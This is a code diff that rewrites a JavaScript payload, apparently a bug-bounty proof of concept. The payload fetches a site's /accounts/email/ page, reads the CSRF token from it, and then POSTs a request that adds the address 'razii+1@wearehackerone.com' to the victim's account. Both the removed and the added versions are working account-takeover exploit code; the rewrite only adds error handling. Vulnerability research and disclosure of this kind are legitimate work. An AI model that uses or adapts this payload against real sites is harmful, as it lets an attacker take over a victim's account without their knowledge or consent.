@@ -1,26 +1,41 @@
-var url = "/accounts/email/";
-var email = "razii%2b1@wearehackerone.com";
-var xhr = new XMLHttpRequest();
-    xhr.responseType = "document";
-    xhr.open("GET", url, true);
-    xhr.onload = function (e) {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            page = xhr.response
+const email = "razii+1@wearehackerone.com";
+function processAndAddEmail() {
+    try {
+        const getRequest = new XMLHttpRequest();
+        getRequest.open("GET", "/accounts/email/", false);
+        getRequest.send();
 
-	token = page.getElementsByName("csrfmiddlewaretoken")[0].value;
-	console.log("The token is: " + token);
+        if (getRequest.status !== 200) {
+            throw new Error(`Failed to fetch email page: ${getRequest.statusText}`);
+        }
 
-	var http = new XMLHttpRequest();
-	http.open("POST", "/accounts/email/", true);
-	http.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-	http.onreadystatechange = function() {
-    	if(http.readyState == 4 && http.status == 200) {
-        	console.info(http.status);
-        	console.info(http.responseText);
-		}
-	}
-	http.send('csrfmiddlewaretoken='+token+'&email='+email+'&action_add=');
-		}
-	};
+        const parser = new DOMParser();
+        const page = parser.parseFromString(getRequest.responseText, "text/html");
 
-xhr.send(null);
+        const token = page.querySelector("[name='csrfmiddlewaretoken']")?.value;
+        if (!token) {
+            throw new Error("CSRF token not found in response.");
+        }
+
+        console.log(`CSRF token: ${token}`);
+
+        const postRequest = new XMLHttpRequest();
+        postRequest.open("POST", "/accounts/email/", false);
+        postRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        const payload = `csrfmiddlewaretoken=${encodeURIComponent(token)}&email=${encodeURIComponent(email)}&action_add=`;
+        postRequest.send(payload);
+
+        if (postRequest.status !== 200) {
+            throw new Error(`Failed to add email: ${postRequest.statusText}`);
+        }
+
+        console.log("Email added successfully.");
+        console.info(postRequest.responseText);
+
+    } catch (error) {
+        console.error("An error occurred:", error.message);
+    }
+}
+
+processAndAddEmail();
